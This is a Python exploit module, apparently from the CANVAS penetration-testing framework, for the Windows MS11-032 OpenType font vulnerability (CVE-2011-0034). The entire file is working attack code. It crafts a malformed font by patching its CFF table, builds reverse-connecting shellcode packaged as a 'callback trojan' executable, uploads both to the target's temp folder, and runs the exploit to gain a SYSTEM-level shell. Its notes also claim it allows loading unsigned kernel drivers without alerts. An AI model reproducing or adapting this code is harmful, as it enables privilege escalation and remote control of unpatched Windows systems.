#!/usr/bin/env python
# (c) Immunity, Inc. 2010
import sys
import os

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine
from canvasexploit import canvasexploit
from exploitutils import *
import shellcode.standalone.windows.payloads as payloads
from shellcode import shellcodeGenerator
from MOSDEF import pelib

#GUI Info
NAME='MS11-032 Privilege Escalation Exploit'
DESCRIPTION='MS11-032 OpenType Signed Integer Vulnerability'
DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2011-0034'
DOCUMENTATION['CVE Url']='https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0034'
DOCUMENTATION['Notes']='Tested on Windows XP SP3 x86, Windows 2003 SP2 x86/64, Windows 2008 x86/64, Windows 7 x86/64.'
VERSION='1.0'
PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP', '2003', 'Vista', '2008', '7']
PROPERTY['MS PATCHES']=["KB2507618"]
NOTES="""
The exploit will also facilitate the loading of unsigned kernel drivers
without triggering any alerts on 64bit Windows.
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',[0,0,0,0]]
}

# Some globals to make the code a little more readable
CFF = 0x43464620
CHECKSUM = 0
OFFSET = 1
LENGTH = 2
TABLEDATA = 3

MAX_TRIES = 40 # Number of times to call accept on remote listener

from ExploitTypes.localexploit import LocalExploit
from engine.config import canvas_root_directory
import random

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.base_fontname  = "ms11_032_base.otf"
        self.files          = {'x86' :'ms11_032.exe', 'x64': 'ms11_032-64.exe' }
        self.MS11_032       = [ 'ms11_032.exe' , 'ms11_032.otf' ]
        self.local_path     = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.trojan_name    = 'CB%s.EXE'%random.randint(0,1000)
        self.isX64          = False
        return

    def get_args(self):
        """
        Retrieve and initialize arguments
        """
        self.node           = self.argsDict['passednodes'][0]
        return

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def calculateOtfChecksum(self, tableData):
        """The checksum is the sum of all the 32-bit longs in the table data"""
        while len(tableData)%4 != 0:
            tableData += '\x00' # add 0s to make the data 4 byte aligned

        end = len(tableData)
        i = 0
        chksum = 0
        while i<end:
            bigEndian = tableData[i:i+4]
            chksum += struct.unpack(">L", bigEndian)[0]
            i += 4

        return chksum & 0xffffffff # only care about the lower 32 bits

    def getNextTable(self,tables):
        next = None
        best = 0xffffffff
        for entry in tables:
            if tables[entry][OFFSET] < best:
                best = tables[entry][OFFSET]
                next = entry
        return next

    def modifyCFF(self, cffData):
        """parsing starts at offset 0x5d81 in the CFF of our sample OTF file

        """
        stackBuffer = '\xff\x00\x03\x00\x00' #slot to read dst (must be < 4)
        if self.isX64:
            stackBuffer+= '\xff\x00\x02\x00\x00' #this * 4 = value added to dst
        else:
            stackBuffer+= '\xff\x00\x01\x00\x00' #this * 4 = value added to dst
        stackBuffer+= '\xff\x00\x02\x00\x00' #this * 8 = value added to src
        if self.isX64:
            stackBuffer+= '\xff\x80\x02\x00\x00' #this * 4 = size of memcpy (cast as short)
        else:
            stackBuffer+= '\xff\x80\x01\x00\x00' #this * 4 = size of memcpy (cast as short)
        stackBuffer+= '\x0c\x08\xff\x41\x00\x00\x13\x8e\x01' #0c 08 to hit the vulnerable code
        l = len(stackBuffer)
        #print "DEBUG: len modified buffer = 0x%x (%d)"%(l,l)
        newCffData = cffData[0:0x5d81] + stackBuffer + cffData[0x5d81+l:]
        return newCffData

    def reconstructTtf(self, directory, tables):
        ttf = directory
        data = ''
        #need to sort by OFFSET so that the reconstructed file is correct
        while 1:
            table = self.getNextTable(tables)
            if table == None:
                break

            #print "reconstructing table %s (offset %x)"%(struct.pack(">L",table),tables[table][OFFSET])
            ttf += struct.pack(">LLLL", table, tables[table][CHECKSUM],
                               tables[table][OFFSET], tables[table][LENGTH])
            #round the table data out to 4 byte alignment
            tableData = tables[table][TABLEDATA]
            while len(tableData)%4 != 0:
                tableData += '\x00' # add 0s to make the data 4 byte aligned

            data += tableData
            del tables[table] # remove that entry

        ttf += data
        return ttf

    def createModifiedOtf(self,fontData):
        tables = {}
        i=0xc
        topDirectory = fontData[0:i]
        (scalerType,numTables,searchRange,entrySelector,rangeShift) = struct.unpack(">LHHHH", topDirectory)
        #print "Found %d tables"%numTables
        for e in range(0,numTables):
            directory = fontData[i:i+0x10]
            (tag,chksum,offset,length) = struct.unpack(">LLLL", directory)
            tableData = fontData[offset:offset+length]
            tables[tag] = (chksum,offset,length,tableData)
            #print "tag: %s"%(struct.pack(">L",tag))
            i+=0x10
        ptr = i

        #calculate the checksum for the CFF table
        oldchksum = self.calculateOtfChecksum(tables[CFF][TABLEDATA])
        #print "old checksum: %x"%oldchksum

        #modify the CFF data (maintaining overall data length--otherwise may need to revisit TTF fields)
        cffData = tables[CFF][TABLEDATA]
        newCffData = self.modifyCFF(cffData)

        #recalculate the table checksum
        newchksum = self.calculateOtfChecksum(newCffData)
        #print "new checksum: %x"%newchksum
        newTuple = (newchksum, tables[CFF][OFFSET], tables[CFF][LENGTH], newCffData)
        tables[CFF] = newTuple

        newFontData = self.reconstructTtf(topDirectory, tables)
        return newFontData

    def init_MS11_032(self):
        """
        Uploads the ms11_032 exe and font file
        """

        if self.isX64:
            filename = self.files["x64"]
        else:
            filename = self.files["x86"]
        print '****** '+filename
        self.MS11_032[0] = filename

        #Build OTF
        src = os.path.join(self.local_path, self.base_fontname)
        dst = os.path.join(self.local_path, self.MS11_032[1])

        fp = open(src, 'rb')
        otf = fp.read()
        fp.close()
        newotf = self.createModifiedOtf(otf)
        fp = open(dst, 'wb')
        fp.write(newotf)
        fp.close()

        for file in self.MS11_032:
            src = os.path.join(self.local_path, file)
            dst = os.path.join(self.remote_path, file)
            try:
                self.node.shell.upload(src, destfilename = dst)
                self.log('[+] Uploaded %s to %s' % (src, dst))
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                self.log('[-] Could not upload %s to %s' % (src, dst))
                return False
        return True

    def uninit_MS11_032(self):
        """
        Remove the ms11_032 exe/otf
        """
        for file in self.MS11_032:
            try:
                dst = os.path.join(self.remote_path, file)
                ret = self.node.shell.unlink(dst)
                self.log('[+] %s' % ret)
            except:
                import traceback
                traceback.print_exc(file=sys.stderr)
                return False
        return True

    def spawn_MS11_032(self, arg1, arg2):
        """
        spawn MS11_032
        """
        try:
            dst = os.path.join(self.remote_path, self.MS11_032[0])
            print dst + ' ' +'"'+arg1+'"' + ' ' +'"'+arg2+'"'
            ret = self.node.shell.CreateProcessA(dst + ' ' +'"'+arg1+'"' + ' ' +'"'+arg2+'"',
                                                 inherithandles=1,
                                                 dwCreationFlags = 0x00000200)
            self.log(ret)
            if not ret:
                return False
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def cleanup(self):
        if self.uninit_MS11_032() == False:
            self.log('[-] Could not uninit MS11_032...')
            return False

        self.log('[+] NOTE: %s\\%s still exists on the host!' % (self.remote_path, self.trojan_name))

    def init_callback(self):
        """
        Build + upload the MOSDEF callback trojan
        """
        if not self.callback:
            self.log('[-] No callback set!')
            return False
        trojan = ''
        try:
            sc = shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp', {'subespval': 0})
            sc.addAttr('revert_to_self_before_importing_ws2_32', None)
            sc.addAttr('tcpconnect', {'port' : self.callback.port,
                                      'ipaddress' : self.callback.ip})
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
            sc.addAttr("ExitThread",None)
            sc.vAllocSelf = True #we need to move to another page!
            callback_payload = sc.get()
            myPElib = pelib.PElib()
            trojan = myPElib.createPEFileBuf(callback_payload)

            # write out the binary
            src = os.path.join(self.local_path, self.trojan_name)
            self.log('[+] Creating callback trojan in %s' % src)
            fd = open(src, 'wb')
            fd.write(trojan)
            fd.close()
            # upload the binary
            self.log('[+] Uploading callback trojan ...')
            dst = os.path.join(self.remote_path, self.trojan_name)
            ret = self.node.shell.upload(src, destfilename = dst)
            self.log('[+] %s' % ret)
            os.unlink(src)
        except:
            import traceback
            traceback.print_exc(file=sys.stderr)
            return False
        return True

    def run(self):

        self.get_args()

        if self.node.nodetype.lower() not in ['win32node', 'win64node']:
            self.log('[-] Node Type %s not supported ...'%self.node.nodetype)
            return False

        self.isX64 = False
        if self.node.nodetype == "win32Node":
            #if WoW, then use x64
            if self.node.shell.is_wow_64:
                self.isX64 = True
        elif self.node.nodetype == "win64Node":
            self.isX64 = True

        #first, we check to make sure we are not
        #already local/SYSTEM - is there a better way?
        whoami=self.exploitnodes('whoami',[self.node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log("It appears you are already running as LOCAL/SYSTEM!")
            return 1

        ret,nodeos=self.node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))

        if self.isX64:
            self.remote_path=self.node.shell.GetEnvironmentVariable('TEMP')
        else:
            self.remote_path = self.node.shell.GetTempPathA()
        if not self.remote_path:
            self.log('[-] Could not resolve full temp dir path ...')
            return False
        else:
            self.log('[-] Temp dir: %s' % self.remote_path)

        if self.node.shell.chdir(self.remote_path) < 0:
            self.log('[-] Could not chdir into %s' % self.remote_path)
            return False

        # build and upload callback trojan
        if self.init_callback() == False:
            self.log('[-] Could not init callback ...')
            return False

        # upload ms11_032 binaries
        if self.init_MS11_032() == False:
            self.log('[-] Could not init MS11_032 ...')
            return False

        # spawn ms11_032
        trojan = os.path.join(self.remote_path, self.trojan_name)
        font = os.path.join(self.remote_path, self.MS11_032[1])

        if self.spawn_MS11_032(trojan, font) == False:
            self.log('[-] Could not spawn MS11_032 ...')
            return False

        for i in range(MAX_TRIES):
            self.log('[+] Checking listener (%d/%d)' % (i+1, MAX_TRIES))
            if self.ISucceeded():
                self.log('[+] MS11_032 succeeded ...')
                self.cleanup()
                return True

            time.sleep(1)

        self.cleanup()
        self.log('[-] MS11_032 failed ...')
        return False

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
